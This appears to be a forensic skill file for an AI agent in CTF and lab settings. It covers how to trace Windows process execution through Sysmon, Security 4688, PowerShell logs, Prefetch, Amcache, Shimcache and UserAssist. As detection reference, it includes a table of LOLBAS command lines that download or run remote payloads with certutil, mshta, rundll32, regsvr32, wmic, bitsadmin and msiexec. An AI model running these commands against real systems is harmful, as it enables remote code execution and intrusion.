---
name: dfir-execution-trace
description: >
  Action-oriented depth skill for Process execution trace. Use after the router or tools/classify.py names this class; start with the first probe and record the expected signal. Do not use it as proof of a finding. Confusable classes: dfir-persistence-trace, dfir-authentication-trace.
  Catalogue class: nothing in this toolkit has solved one yet.
tags: [dfir, forensics, execution, sysmon, prefetch, bug-class]
environment: [ctf, lab, authorized-testing]
budget:
  stuck_threshold: 3
  on_stuck: pivot
  stop_conditions:
    - "same artifact family: 3 attempts with no new record"
    - "the class falsifier is observed"
evidence_level: catalogue
---
# Process execution trace

**Catalogue class.** Never solved here: what follows is published knowledge, not local experience, and what actually
happens belongs in `field-notes.md`. Scope: what ran, when, how often, with what command line, from what parent.

## First probe

```bash
python3 tools/forensics/evtx_query.py --input sysmon.jsonl --event-id 1 \
  --field-contains Image=\\Users\\ --challenge <name> \
  --class dfir-execution-trace --hypothesis-id h1 --evidence-kind class
```

**Falsifier** - the observation that closes this class: `summary.by_event_id_all_records` (which says up front whether
1, 4688, 4103 and 4104 exist at all) shows none of them, and every process record present has `Image` under
`C:\Windows\System32`, `ParentImage` of `services.exe` or `explorer.exe`, and no `CommandLine` with a URL scheme or a
base64 run.

## Recognise

The question wording decides the artifact before any tool runs:

| Question wording | Field that answers it |
|---|---|
| "what was the full command used to ..." | Sysmon 1 `CommandLine`, or 4688 `CommandLine` if policy filled it, or classic 400 `HostApplication` |
| "how many times was X executed" | prefetch run-count DWORD, or UserAssist `0x04` (minus 5 on XP) |
| "when was X first executed" | oldest non-zero of the eight prefetch FILETIMEs at offset 44; does not exist on a version-23 `.pf` |
| "what process spawned / what is the parent of" | Sysmon 1 `ParentImage` + `ParentCommandLine`, or 4688 `ParentProcessName` (version 2 only) |
| "what is the SHA-1 / MD5 of" | Sysmon 1 `Hashes`, or Amcache `FileId` with the leading `0000` stripped |
| "decode the encoded command" | 4104 `ScriptBlockText`, or the base64 after `-enc` in `CommandLine`, UTF-16LE |
| "what IP / domain did it contact" | Sysmon 3 `DestinationIp` / `DestinationHostname`, joined on `ProcessGuid` |

## Confirm

Quote the field, not the filename: the `CommandLine` string verbatim with its quotes, the prefetch run-count DWORD or
the UserAssist run count at `0x04`, the FILETIME as the record renders it.

| Rank | Artifact | Proves |
|---|---|---|
| 1-2 | Sysmon 1, then Security 4688 | execution + command line + parent + hash + integrity level; 4688 has the command line only by policy |
| 3-6 | PowerShell 4104, Prefetch, then Amcache / UserAssist, then Shimcache | the script text after the parser deobfuscated it; execution with a run count and the last eight run times; file presence or a GUI launch with a count; and last, Shimcache, which proves only that the path was seen |

## Event-log records: Sysmon 1, Security 4688, PowerShell

`Microsoft-Windows-Sysmon/Operational`. Microsoft Learn describes event 1 but publishes no field list (checked):
confirm names with `sysmon -s` or one dumped record. `*` marks the six in `tools/forensics/fixtures/evtx/sherlock_sample.jsonl`.

| Sysmon 1 fields | What a question wants them for |
|---|---|
| `Image` * , `CommandLine` * , `CurrentDirectory` | full path of what ran; the literal answer to "what command was run", quotes included; and the staging folder |
| `User` * , `LogonId`, `IntegrityLevel` | acting identity as `DOMAIN\user`; `LogonId` joins to Security 4624 for that session; `Low`/`Medium`/`High`/`System` says whether it was elevated |
| `ProcessGuid` * , `ProcessId` | the join key; and the OS PID, which is reused and so is never the join key |
| `ParentProcessGuid`, `ParentImage` * , `ParentCommandLine` | one exact level up: the parent-child oddity, and how the parent was itself invoked |
| `Hashes` * , `OriginalFileName` | `SHA1=`/`MD5=`/`IMPHASH=` per the HashAlgorithms config; and the PE version-resource name, which catches a renamed binary |

**Why `ProcessGuid`, not PID.** Microsoft Learn (Sysinternals, Sysmon): `ProcessGUID` "is a unique value for this
process across a domain to make event correlation easier", and Sysmon "includes a process GUID in process create
events to allow for correlation of events even when Windows reuses process IDs" - a PID join attaches a later
process's connection to an earlier process's creation. The same GUID is on Sysmon 3, 5, 7, 8, 10, 11, 12/13 and 22.

| Security 4688 field | What it gives, and the trap (names verified: Microsoft Learn, 4688) |
|---|---|
| `NewProcessName`, `NewProcessId`, `SubjectUserName`, `SubjectLogonId`, `TargetUserName`, `TargetLogonId` | the executed path and its PID (`ProcessId` in this event is the *creator* PID, not the child); who created it and, when the logons differ, who it ran as; `SubjectLogonId` joins to 4624 |
| `ParentProcessName` | event version 2 only (Windows 10). Version 0 = Vista/2008; version 1 (2012 R2 / 8.1) **added** the command line; version 2 added Target Subject + `MandatoryLabel` + `ParentProcessName`. **Naming trap:** Microsoft Learn calls this field **Creator Process Name**, and `ProcessId` **Creator Process ID**, so a rendered CSV or Event Viewer export has no string `ParentProcessName` in it while the raw XML `Data Name` does. On 2008/2012 the parent joins on the creator PID inside a window, which PID reuse breaks |
| `TokenElevationType` | `%%1936` full token (UAC off, built-in Administrator, service, LocalSystem); `%%1937` elevated, started with Run as administrator; `%%1938` limited. `%%1937` from a real user account (no `$` in the name) on a workstation is the documented "a user ran a program with administrative privileges" signal. `MandatoryLabel` decodes as `S-1-16-0` untrusted, `4096` low, `8192` medium, `8448` medium-plus, `12288` high, `16384` system, `20480` protected process |
| `CommandLine` | "By default **Process Command Line** field is empty" (Microsoft Learn). Policy: Administrative Templates\System\Audit Process Creation\Include command line in process creation events; registry value `ProcessCreationIncludeCmdLine_Enabled` = REG_DWORD 1 under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit` |

A blank command line is policy, not a parse failure. Measured in this tree's fixture: the 4688 at `11:03:58.400000Z`
has `"CommandLine": ""` while the Sysmon 1 for the same `Image` 10 ms later carries
`"C:\Users\analyst\Downloads\invoice_2026.exe" -enc SQBFAFgA`. Substitutes: Sysmon 1, 4104, classic 400
`HostApplication`, the `.pf` referenced-file list.

| PowerShell channel | ID | Carries |
|---|---|---|
| `Microsoft-Windows-PowerShell/Operational` | 4104, 4103 | 4104: `ScriptBlockText`, `ScriptBlockId`, `MessageNumber`, `MessageTotal`, `Path`. 4103: module / pipeline detail (`ContextInfo`, `Payload` - names UNVERIFIED here) |
| `Windows PowerShell` (classic) | 400 / 403 / 600 | engine Available / Stopped, then provider lifecycle: `HostName`, `HostApplication`, `EngineVersion`, `RunspaceId`, `HostId`; a 600 joins its 400 on `HostId` + `RunspaceId` |

Microsoft Learn (about_Logging 5.1) pins 4104 as EventId `4104`/`0x1008`, Level Verbose, Opcode Create, Task
CommandStart, Keyword Runspace, provider `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}`; PowerShell 7 writes the same ID to
`PowerShellCore/Operational`, provider `{f90714a8-5509-434a-bf6d-b1624c8a19a2}`. Enabled by
`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`, `EnableScriptBlockLogging` = 1 (PowerShell
7: `...\Microsoft\PowerShellCore\ScriptBlockLogging`). **Reassembly:** group on `ScriptBlockId`, sort ascending on
`MessageNumber`, concatenate `ScriptBlockText`, check the part count equals `MessageTotal`; part 1 alone truncates
mid-token, the usual reason a decoded URL comes out wrong. **`-EncodedCommand` is base64 of UTF-16LE** and `-e`,
`-ec`, `-enc` all bind to it, so match `-e` plus a base64 run: `python3 -c 'import
base64,sys;print(base64.b64decode(sys.argv[1]).decode("utf-16-le"))' SQBFAFgA`. Classic 400 `HostApplication` holds
the invocation verbatim including `-EncodedCommand <blob>`, recovering it with script-block logging off; with
Protected Event Logging on, `ScriptBlockText` is a CMS blob, decrypted per Microsoft Learn by piping the 4104 records
through `Unprotect-CmsMessage` with a private key a handout rarely ships.

## On-disk and hive residue: Prefetch, Amcache, Shimcache

`C:\Windows\Prefetch\NAME.EXE-XXXXXXXX.pf`; `XXXXXXXX` is the 4-byte prefetch hash at header offset 76 in hex, so two
`.pf` for one name means two distinct paths - itself an answer. Offsets from the libyal/libscca PF format docs.

| Version | Windows | Last-run FILETIMEs | At offset | Run count at |
|---|---|---|---|---|
| 17 | XP / 2003 | 1 | 36 | 60 |
| 23 | Vista / 7 | **1 only** | 44 | 68 |
| 26 | 8.0 / 8.1 | 8 (64 bytes) | 44 | 124 |
| 30 | 10 | 8 | 44 | 124 in the 220-byte variant, 116 in the 212-byte variant |
| 31 | 11 | 8 | 44 | 116 - libscca records version 31 as the 212-byte version-30 variant |

Header: version at 0, `SCCA` at 4, executable filename at 16 (60 bytes, UTF-16), prefetch hash at 76; 84 bytes. The
first FILETIME is the most recent run, so "when did it FIRST run" is the oldest non-zero of the eight or the `.pf`'s
own creation time - Windows 7 stores one timestamp, so that answer does not exist there. The referenced-file list
(DLLs and data touched in the first ten seconds) ties a loader to its payload and recovers a dropped path. Windows
8.1/10/11 `.pf` are **compressed**: `MAM\x04` at offset 0, algorithm `COMPRESSION_FORMAT_XPRESS_HUFF`, SCCA header
visible only after LZXPRESS-Huffman decompression, so `strings` returning nothing is compression, not emptiness.
Policy gate: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters`,
`EnablePrefetcher` 0 disabled / 1 application launch / 2 boot only / 3 both (client default); server builds default to
boot only, so no application `.pf` on a server is expected, not evidence.

`C:\Windows\AppCompat\Programs\Amcache.hve` is a hive, so replay `LOG1`/`LOG2` first per
`../dfir-sherlock-triage/registry-and-execution.md`. One `InventoryApplicationFile` subkey per binary (Securelist,
AmCache).

| Value | Holds |
|---|---|
| `FileId` | **SHA-1 with four zeroes prefixed** - strip `0000` for the 40-character hash. Computed over only the first 31,457,280 bytes, so a larger file's `FileId` will not match a hash you compute |
| `LowerCaseLongPath`, `Name`, `OriginalFileName`, `Size`, `LinkDate`, `ProgramId` | full lowercase path; base name as it sat on disk; the PE version-resource name, which differs from `Name` exactly when the binary was renamed; bytes; the PE compile timestamp; and the join to `InventoryApplication` that separates an installed application from a standalone dropped binary |
| `ProductName`, `Publisher`, `Version`, `BinFileVersion`, `BinaryType`, `IsPeFile`, `IsOsComponent` | the PE version resource, 32/64-bit, whether it is a PE, and whether it shipped with Windows |

Amcache records file presence, not a run, so an SHA-256 question needs the sample itself. Shimcache sits at
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache`; only 32-bit Windows XP used
`...\Session Manager\AppCompatibility\AppCompatCache`. Capacity is **1024 entries from Vista / Server 2008 onward**,
512 on Server 2003, 96 on XP (artefacts.help, windows_shimcache) - so "1024 on Windows 8+, 512 before" is wrong for
Vista and 7 and must not be used to date a hive. Vista through 8.1 carry an insert flag whose `0x2` bit tracked
execution in mandiant's testing, but mandiant/ShimCacheParser's own README says "This flag's true purpose is currently
unknown" and that it must not conclusively determine execution; the Windows 10 format has no such flag. The cache is
written at shutdown, so a live-captured hive can lack the newest entries.

## Per-user execution: UserAssist, RunMRU, RecentDocs, history, transcripts

| Artifact | Path and structure |
|---|---|
| UserAssist | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count`; `{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}` executed EXEs, `{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}` LNK launches (Securelist, UserAssist) |
| UserAssist value | the name is the path in ROT13 (`rundll32.exe` -> `ehaqyy32.rkr`, decode with `python3 -c 'import codecs,sys;print(codecs.decode(sys.argv[1],"rot13"))' ehaqyy32.rkr`); 72 bytes: `0x00` session id, `0x04` **run count**, `0x08` focus count, `0x0C` focus time in ms, `0x10`-`0x37` usage percentages, `0x38` percentage index, `0x3C` **last-execution FILETIME**, `0x44` unknown. XP is 16 bytes, run count at `0x04`, FILETIME at `0x08`, and the XP raw counter **starts at 5**, so subtract 5 before answering "how many times"; XP offsets on a 72-byte value yield a 1601 timestamp. GUI launches only, so a console command is absent and that absence is not an answer |
| `RunMRU`, `RecentDocs` | `NTUSER.DAT\...\Explorer\RunMRU` holds strings typed into the Run box, values `a`..`z` each ending `\1` with `MRUList` giving the order; `...\Explorer\RecentDocs\.<ext>` holds files opened per extension, `MRUListEx` being little-endian DWORDs, newest first |
| PSReadLine history | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\$($Host.Name)_history.txt` (Microsoft Learn, Set-PSReadLineOption `-HistorySavePath`), so the console host writes `ConsoleHost_history.txt` but VS Code writes `Visual Studio Code Host_history.txt` - grep the directory, not the one name. Commands in order, **with no timestamps in the file**. `HistorySaveStyle` default is `SaveIncrementally` (Learn: "Default value: SaveIncrementally"), so one `$J` `DATA_EXTEND` equals one command - see `../ctf-forensics/windows.md:394-408`. Learn prints `MaximumHistoryCount` as "Default value: None"; the 4096 figure is the PSReadLine source default and is UNVERIFIED here, so read it with `Get-PSReadLineOption` rather than assert it. **Scrubbing:** PSReadLine refuses to write any command line containing `password`, `asplaintext`, `token`, `apikey` or `secret` (Learn, about_PSReadLine), so a credential command is absent by design and the absence proves nothing |
| Transcripts | `PowerShell_transcript.<host>.<random>.<yyyyMMddHHmmss>.txt`: input **and output**, a distinct artifact from 4104, controlled by the `Transcription` key beside `ScriptBlockLogging` (`EnableTranscripting`, `OutputDirectory`); header field names UNVERIFIED here |

## LOLBAS command lines: the signed binary is the Image, the payload is the CommandLine

Each row is quoted from that binary's own YAML in LOLBAS-Project/LOLBAS, `yml/OSBinaries/`, fetched for this file. The
signed binary is the `Image`, so the payload is in `CommandLine` and the parent-child pair, not in a filename.

| Command as LOLBAS documents it | What it buys |
|---|---|
| `certutil.exe -urlcache -f {url} {path}` | download to disk; `-verifyctl -f {url}` with no path lands in `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`; `-decode {b64} {out}` decodes a staged payload |
| `mshta.exe javascript:a=GetObject("script:{url}").Exec();close();` | remote scriptlet, nothing on disk; `mshta.exe "{path}:file.hta"` runs an HTA from an alternate data stream |
| `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{url}")` | remote scriptlet via rundll32; `-sta {CLSID}` loads a COM server by CLSID alone. `regsvr32 /s /n /u /i:{url}.sct scrobj.dll` does the same through `scrobj.dll`, with `/u` routing execution to DllUnregisterServer |
| `wmic.exe process call create "{cmd}"` | parent becomes `WmiPrvSE.exe`, not `wmic`; `/node:"{ip}"` aims it at another host; `process get brief /format:"{url}.xsl"` runs remote XSL as script |
| `bitsadmin /create 1 & bitsadmin /addfile 1 {url} {path} & bitsadmin /RESUME 1 & bitsadmin /complete 1` | download by the BITS service, so the network event belongs to `svchost.exe`; `/SetNotifyCmdLine 1 {path} NULL` makes BITS launch the payload on completion |
| `msiexec /q /i {url}`, `forfiles /p c:\windows\system32 /m notepad.exe /c "{cmd}"` | silent install straight from a URL (`/y {path}.dll` calls DllRegisterServer); and `forfiles.exe` becoming the parent process. `InstallUtil.exe /logfile= /LogToConsole=false /U {path}.dll` runs .NET code through the installer utility, and `InstallUtil.exe {url}` downloads into INetCache |

Two corrections: LOLBAS `Bitsadmin` uses `/create` + `/addfile` + `/RESUME` + `/complete`, **not** `/transfer`
(checked `Bitsadmin.yml`); `Rundll32.yml` lists only five commands, so `advpack` / `ieadvpack` / `shell32
ShellExec_RunDLL` are not in it. Corroborate BITS in `BITS-Client/Operational` 59/60, `wmic` in
`WMI-Activity/Operational` 5857/5858/5860/5861.

## Operational probe - the day-zero pipeline proven on this box

Convert once to JSONL, then filter many times; both commands below were run here against
`tools/forensics/fixtures/evtx/sherlock_sample.jsonl` and the outputs quoted are what they printed. The chain is
Sysmon 1 -> `ProcessGuid` -> Sysmon 3.

```bash
F=tools/forensics/fixtures/evtx/sherlock_sample.jsonl   # swap for the bundle's own JSONL
python3 tools/forensics/evtx_query.py --input $F --event-id 1 \
  --field-contains CommandLine=-enc --challenge <name> --compact
# measured: records.read 10, records.matched 1; ProcessGuid {a1b2c3d4-0001-6650-0000-0010a5c80100}
python3 tools/forensics/evtx_query.py --input $F --event-id 3 \
  --field ProcessGuid='{a1b2c3d4-0001-6650-0000-0010a5c80100}' \
  --challenge <name> --answer DestinationIp --compact
# measured: 1 matched at 11:04:12.880000Z, answer.value 203.0.113.77
```

`--answer` emits the `tools/hooks.py pre-flag` argv with the matched record as `--evidence`, so no answer is retyped.
Across families, one axis, and the hole is the finding - run here against the tree's own fixtures:
`python3 tools/forensics/timeline_merge.py --source tools/forensics/fixtures/timeline/proc_events.tsv:epoch:proc
--source tools/forensics/fixtures/timeline/auth_events.csv:when:auth --challenge <name> --gap 300` returned 5 merged
rows and one gap of 499 s after the Sysmon 3 at `11:04:12+00:00`. `TIMECOL` is that file's real column name, so read
the header first; a wrong name parses zero rows from that source and the merge stays silently one-sided.

## Traps

- A blank 4688 `CommandLine` is a policy state, not a missing record; joining Sysmon 1 to 3 on `ProcessId` rather than
  `ProcessGuid` attaches the wrong connection after PID reuse.
- **No EVTX parser is installed here today**: `command -v evtx_dump`, `evtxexport`, `chainsaw`, `hayabusa` all return
  nothing and `import Evtx` raises `ModuleNotFoundError`, so a raw `.evtx` cannot be opened until
  `sudo apt install --no-install-recommends python3-evtx libevtx-utils chainsaw` from
  `../dfir-sherlock-triage/toolchain.md` has run. Day zero, `evtx_query.py` still takes `.jsonl`, `.json` and
  `<Event>` `.xml`, which is the shape a Sherlock bundle or a colleague's export usually already has. After
  installing: `evtx_dump` is multithreaded by default and emits records out of order, so pass `-t 1` - and
  `evtx_query.py` re-sorts on the parsed timestamp regardless and prints `input_was_chronological`.
- `sysmon -s` runs on the Windows host, not from a handout; with only a bundle in hand, confirm a Sysmon field name
  from one dumped record rather than from memory.
- Shimcache answers "was this path seen", never "was this executed"; an Amcache `FileId` over 31,457,280 bytes of file
  will not match your SHA-1.
- A Windows 7 `.pf` holds one execution timestamp, not eight; part 1 of a split 4104 alone truncates the script.
- Sysmon `UtcTime` is UTC; converters often render Security local - see the router's `../dfir-sherlock-triage/answer-discipline.md`.

## Routing

Shares signals with `dfir-persistence-trace` (a Run value or service image path is registration, not execution) and
`dfir-authentication-trace` (4624/4625 and logon type); check both first. Do not restate:
`../dfir-sherlock-triage/windows-event-logs.md` (ID tables), `../dfir-sherlock-triage/registry-and-execution.md` (hive
and prefetch tooling), `../dfir-sherlock-triage/method.md:63-82` (the execution chain),
`../ctf-forensics/windows.md:294-354` (timestomping, USN parser), `../ctf-forensics/windows.md:457-479` (MPLog,
DetectionHistory). Classify with `python3 tools/classify.py`.

## Discipline

One field per answer, quoted verbatim. "It was executed" is not a finding unless the record saying so is in the
evidence. Absence from Prefetch, UserAssist or Amcache is a policy or scope statement, never a negative answer. Three
attempts in one family with no new record: pivot to the next rank in the Confirm ladder.
